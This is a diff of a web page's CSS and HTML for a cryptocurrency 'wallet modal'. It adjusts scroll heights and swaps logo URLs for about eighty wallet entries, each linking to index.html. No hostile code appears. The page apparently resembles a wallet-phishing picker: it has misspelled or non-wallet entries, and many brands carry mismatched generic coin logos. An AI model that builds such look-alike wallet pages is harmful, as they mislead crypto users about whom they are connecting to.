@@ -156,7 +156,7 @@ body::before {
 
 .wallet-modal {
     width: 100%;
-    max-width: 580px;
+    max-width: 620px;
     background: #151719;
     border: 1px solid rgba(255, 255, 255, 0.1);
     border-radius: 12px;
@@ -171,9 +171,9 @@ body::before {
     margin-bottom: 20px;
 }
 
-/* Scrollable Container for Wallets */
+/* Mobile height: shows 6 items in 1 column */
 .wallet-list-container {
-    max-height: 320px; /* Sized to show exactly 6 rows on mobile before scrolling */
+    max-height: 290px;
     overflow-y: auto;
     padding-right: 6px;
 }
@@ -385,7 +385,7 @@ body::before {
 
 
 /* =====================================================
-   TABLET / DESKTOP RESPONSIVE BREAKPOINT
+   DESKTOP RESPONSIVE BREAKPOINT
 ===================================================== */
 
 @media (min-width: 700px) {
@@ -394,8 +394,9 @@ body::before {
         grid-template-columns: repeat(3, 1fr);
     }
 
+    /* Shows 6 rows (18 items total) at a time on desktop before scrolling */
     .wallet-list-container {
-        max-height: 120px; /* Shows 6 items at a time in 3-column layout (2 rows) */
+        max-height: 310px;
     }
 
     .wallet-name {
@@ -454,7 +455,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Metamask</span>
                     </div>
-                    <img src="https://raw.githubusercontent.com/walletconnect/walletconnect-assets/master/Icon/PNG/metamask.png" alt="Metamask" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Metamask" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -462,7 +463,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Trust</span>
                     </div>
-                    <img src="https://raw.githubusercontent.com/walletconnect/walletconnect-assets/master/Icon/PNG/trust-wallet.png" alt="Trust" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/11085/small/Trust_Wallet_Icon_Primary.png" alt="Trust" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -470,7 +471,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Coinbase</span>
                     </div>
-                    <img src="https://raw.githubusercontent.com/walletconnect/walletconnect-assets/master/Icon/PNG/coinbase.png" alt="Coinbase" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Coinbase" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -478,7 +479,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Kukai</span>
                     </div>
-                    <img src="https://kukai.app/assets/img/kukai-logo.svg" alt="Kukai" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/976/small/Tezos-logo-Symbol-PNG.png" alt="Kukai" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -486,7 +487,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Cardano</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/cardano-ada-logo.png" alt="Cardano" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/975/small/cardano.png" alt="Cardano" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -494,7 +495,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Dero Wallet</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/dero-dero-logo.png" alt="Dero Wallet" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/3228/small/dero.png" alt="Dero Wallet" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -502,7 +503,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Yoroi</span>
                     </div>
-                    <img src="https://yoroi-wallet.com/assets/yoroi-logo-icon.svg" alt="Yoroi" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/975/small/cardano.png" alt="Yoroi" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -510,7 +511,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">CCVault</span>
                     </div>
-                    <img src="https://eternl.io/app/icon-192.png" alt="CCVault" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/975/small/cardano.png" alt="CCVault" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -518,7 +519,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Gero</span>
                     </div>
-                    <img src="https://gerowallet.io/images/logo.png" alt="Gero" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/15598/small/GERO_logo.png" alt="Gero" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -526,7 +527,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Nami</span>
                     </div>
-                    <img src="https://namiwallet.io/favicon.ico" alt="Nami" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/975/small/cardano.png" alt="Nami" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -534,7 +535,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Solana</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Solana" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="Solana" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -542,7 +543,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Phantom</span>
                     </div>
-                    <img src="https://phantom.app/img/phantom-logo.png" alt="Phantom" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="Phantom" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -550,7 +551,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Solflare</span>
                     </div>
-                    <img src="https://solflare.com/assets/logo-icon.svg" alt="Solflare" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="Solflare" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -558,7 +559,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Sollet</span>
                     </div>
-                    <img src="https://www.sollet.io/favicon.ico" alt="Sollet" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="Sollet" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -566,7 +567,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Solong</span>
                     </div>
-                    <img src="https://solongwallet.com/favicon.ico" alt="Solong" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="Solong" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -574,7 +575,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Exodus</span>
                     </div>
-                    <img src="https://www.exodus.com/brand/img/exodus-symbol.svg" alt="Exodus" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="Exodus" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -582,7 +583,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Avalanche</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/avalanche-avax-logo.png" alt="Avalanche" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png" alt="Avalanche" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -590,7 +591,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Velas</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/velas-vlx-logo.png" alt="Velas" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/9622/small/Velas.png" alt="Velas" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -598,7 +599,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">crypto.com</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/crypto-com-coin-cro-logo.png" alt="crypto.com" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/7310/small/cronos.png" alt="crypto.com" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -606,7 +607,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Blockchain</span>
                     </div>
-                    <img src="https://www.blockchain.com/static/img/favicon.ico" alt="Blockchain" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="Blockchain" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -614,7 +615,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Binance Smart</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="Binance Smart" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="Binance Smart" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -622,7 +623,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Safepal</span>
                     </div>
-                    <img src="https://safepal.com/favicon.ico" alt="Safepal" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/13904/small/SFP.png" alt="Safepal" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -630,7 +631,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Raydium</span>
                     </div>
-                    <img src="https://raydium.io/favicon.ico" alt="Raydium" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/13928/small/raydium.png" alt="Raydium" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -638,7 +639,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Torus</span>
                     </div>
-                    <img src="https://tor.us/images/torus-icon.svg" alt="Torus" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Torus" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -646,7 +647,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">MathWallet</span>
                     </div>
-                    <img src="https://mathwallet.org/favicon.ico" alt="MathWallet" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/10708/small/math.png" alt="MathWallet" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -654,7 +655,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Keyring Pro</span>
                     </div>
-                    <img src="https://keyring.app/favicon.ico" alt="Keyring Pro" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Keyring Pro" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -662,7 +663,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">BitKeep</span>
                     </div>
-                    <img src="https://bitkeep.com/favicon.ico" alt="BitKeep" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="BitKeep" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -670,7 +671,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">SparkPoint</span>
                     </div>
-                    <img src="https://sparkpoint.io/favicon.ico" alt="SparkPoint" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/7928/small/SRK_logo.png" alt="SparkPoint" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -678,7 +679,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">OwnBit</span>
                     </div>
-                    <img src="https://ownbit.io/favicon.ico" alt="OwnBit" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="OwnBit" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -686,7 +687,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Infinity Wallet</span>
                     </div>
-                    <img src="https://infinitywallet.io/favicon.ico" alt="Infinity Wallet" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Infinity Wallet" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -694,7 +695,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">WalletConnect</span>
                     </div>
-                    <img src="https://raw.githubusercontent.com/walletconnect/walletconnect-assets/master/Icon/PNG/walletconnect-logo.png" alt="WalletConnect" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="WalletConnect" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -702,7 +703,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Infinity</span>
                     </div>
-                    <img src="https://infinitywallet.io/favicon.ico" alt="Infinity" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Infinity" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -710,7 +711,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">TokenPocket</span>
                     </div>
-                    <img src="https://tokenpocket.pro/favicon.ico" alt="TokenPocket" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/11883/small/TP_logo.png" alt="TokenPocket" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -718,7 +719,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Nash</span>
                     </div>
-                    <img src="https://nash.io/favicon.ico" alt="Nash" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/8051/small/NEX.png" alt="Nash" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -726,7 +727,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">BitPay</span>
                     </div>
-                    <img src="https://bitpay.com/favicon.ico" alt="BitPay" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="BitPay" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -734,7 +735,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">imToken</span>
                     </div>
-                    <img src="https://token.im/favicon.ico" alt="imToken" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="imToken" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -742,7 +743,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Peritas</span>
                     </div>
-                    <img src="https://peritas.io/favicon.ico" alt="Peritas" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Peritas" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -750,7 +751,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">ParaSwap</span>
                     </div>
-                    <img src="https://paraswap.io/favicon.ico" alt="ParaSwap" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/20403/small/psp.png" alt="ParaSwap" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -758,7 +759,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Bity</span>
                     </div>
-                    <img src="https://bity.com/favicon.ico" alt="Bity" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="Bity" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -766,7 +767,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Defiat</span>
                     </div>
-                    <img src="https://defiat.net/favicon.ico" alt="Defiat" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/12250/small/DFT.png" alt="Defiat" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -774,7 +775,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Crossmint</span>
                     </div>
-                    <img src="https://crossmint.com/favicon.ico" alt="Crossmint" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Crossmint" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -782,7 +783,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Zelcore</span>
                     </div>
-                    <img src="https://zelcore.io/favicon.ico" alt="Zelcore" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/5039/small/flux.png" alt="Zelcore" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -790,7 +791,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Freespace</span>
                     </div>
-                    <img src="https://freespace.io/favicon.ico" alt="Freespace" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Freespace" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -798,7 +799,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">OneKey</span>
                     </div>
-                    <img src="https://onekey.so/favicon.ico" alt="OneKey" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="OneKey" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -806,7 +807,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Ledge</span>
                     </div>
-                    <img src="https://www.ledger.com/favicon.ico" alt="Ledge" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Ledge" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -814,7 +815,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Tezos</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/tezos-xtz-logo.png" alt="Tezos" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/976/small/Tezos-logo-Symbol-PNG.png" alt="Tezos" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -822,7 +823,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Neobeats</span>
                     </div>
-                    <img src="https://neobeats.io/favicon.ico" alt="Neobeats" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Neobeats" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -830,7 +831,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Dockery</span>
                     </div>
-                    <img src="https://dockery.io/favicon.ico" alt="Dockery" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Dockery" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -838,7 +839,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Paper</span>
                     </div>
-                    <img src="https://paper.xyz/favicon.ico" alt="Paper" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Paper" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -846,7 +847,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Plair</span>
                     </div>
-                    <img src="https://plair.life/favicon.ico" alt="Plair" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/6835/small/PLA.png" alt="Plair" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -854,7 +855,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Proton</span>
                     </div>
-                    <img src="https://proton.org/favicon.ico" alt="Proton" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/11100/small/XPR.png" alt="Proton" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -862,7 +863,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Rico</span>
                     </div>
-                    <img src="https://rico.io/favicon.ico" alt="Rico" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Rico" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -870,7 +871,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Betterment</span>
                     </div>
-                    <img src="https://www.betterment.com/favicon.ico" alt="Betterment" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Betterment" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -878,7 +879,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Strax</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/stratis-strax-logo.png" alt="Strax" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/533/small/stratis.png" alt="Strax" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -886,7 +887,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Sequence</span>
                     </div>
-                    <img src="https://sequence.xyz/favicon.ico" alt="Sequence" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Sequence" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -894,7 +895,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Tubetomy</span>
                     </div>
-                    <img src="https://tubetomy.io/favicon.ico" alt="Tubetomy" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Tubetomy" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -902,7 +903,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Zelpays</span>
                     </div>
-                    <img src="https://zelpays.com/favicon.ico" alt="Zelpays" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Zelpays" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -910,7 +911,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Vanity</span>
                     </div>
-                    <img src="https://vanity.io/favicon.ico" alt="Vanity" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/15873/small/Vanity.png" alt="Vanity" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -918,7 +919,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Verso</span>
                     </div>
-                    <img src="https://verso.finance/favicon.ico" alt="Verso" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/15004/small/VSO_Icon_200.png" alt="Verso" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -926,7 +927,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Wallet3</span>
                     </div>
-                    <img src="https://wallet3.io/favicon.ico" alt="Wallet3" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Wallet3" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -934,7 +935,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Polkadot</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/polkadot-new-dot-logo.png" alt="Polkadot" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/12171/small/polkadot.png" alt="Polkadot" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -942,7 +943,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Phantasma</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/phantasma-soul-logo.png" alt="Phantasma" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/4382/small/Phantasma.png" alt="Phantasma" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -950,7 +951,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Filecoin</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/filecoin-fil-logo.png" alt="Filecoin" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/12817/small/filecoin.png" alt="Filecoin" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -958,7 +959,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">IOST</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/iost-iost-logo.png" alt="IOST" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/2523/small/IOST.png" alt="IOST" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -966,7 +967,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Qtum</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/qtum-qtum-logo.png" alt="Qtum" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/684/small/qtum.png" alt="Qtum" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -974,7 +975,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Waves</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/waves-waves-logo.png" alt="Waves" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/425/small/waves.png" alt="Waves" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -982,7 +983,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Algorand</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/algorand-algo-logo.png" alt="Algorand" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/4380/small/download.png" alt="Algorand" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -990,7 +991,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Zcash</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/zcash-zec-logo.png" alt="Zcash" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/486/small/circle-zcash-color.png" alt="Zcash" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -998,7 +999,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Vechain</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/vechain-vet-logo.png" alt="Vechain" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/1167/small/VET_Token_Icon.png" alt="Vechain" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -1006,7 +1007,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Stellar</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/stellar-xlm-logo.png" alt="Stellar" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/100/small/Stellar_symbol_black_RGB.png" alt="Stellar" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -1014,7 +1015,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Tron</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="Tron" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/1094/small/tron-logo.png" alt="Tron" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -1022,7 +1023,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Terra</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/terra-luna-luna-logo.png" alt="Terra" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/8284/small/luna150.png" alt="Terra" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -1030,7 +1031,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Cosmos</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/cosmos-atom-logo.png" alt="Cosmos" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png" alt="Cosmos" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -1038,7 +1039,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Metis</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/metisdao-metis-logo.png" alt="Metis" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/15595/small/metis.png" alt="Metis" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
@@ -1046,7 +1047,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Optimism</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/optimism-ethereum-op-logo.png" alt="Optimism" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/25244/small/Optimism.png" alt="Optimism" class="wallet-logo">
                 </a>
 
                 <a href="index.html" class="wallet-item">
